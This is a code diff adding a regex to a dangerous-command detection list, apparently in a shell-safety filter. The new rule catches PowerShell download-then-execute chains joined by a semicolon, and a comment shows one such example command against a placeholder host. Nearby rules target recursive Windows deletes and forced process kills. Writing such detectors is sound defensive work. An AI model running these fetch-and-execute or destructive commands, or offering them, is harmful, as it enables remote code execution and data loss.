@@ -996,6 +996,10 @@ DANGEROUS_PATTERNS = [
     (r'\b(?:del|erase|rd|rmdir)\s+(?:/[a-z]\s+)*/[sq]\b', "Windows destructive delete (recursive/quiet switch)"),
     # Remote content piped to Invoke-Expression — PowerShell's `curl | sh`.
     (r'\b(?:iwr|invoke-webrequest|invoke-restmethod|irm|curl|wget)\b[^\n]*\|\s*(?:iex|invoke-expression)\b', "pipe remote content to PowerShell (iwr | iex)"),
+    # Download-then-execute chained with a statement separator instead of a
+    # pipe (`$r = irm https://host/p.ps1; iex $r`). The pipe rule above never
+    # sees these because there is no `|` between download and execution.
+    (r'\b(?:iwr|invoke-webrequest|invoke-restmethod|irm|curl|wget)\b[^\n]*;[^\n]*\b(?:iex|invoke-expression)\b', "remote content execution via Invoke-Expression (semicolon chain)"),
     (r'\b(?:iex|invoke-expression)\s*\(\s*(?:iwr|invoke-webrequest|invoke-restmethod|irm)\b', "execute remote content via Invoke-Expression"),
     # Force process kills — Windows analogue of pkill -9.
     (r'\btaskkill\b[^\n]*\s/f\b', "force kill processes (taskkill /F)"),
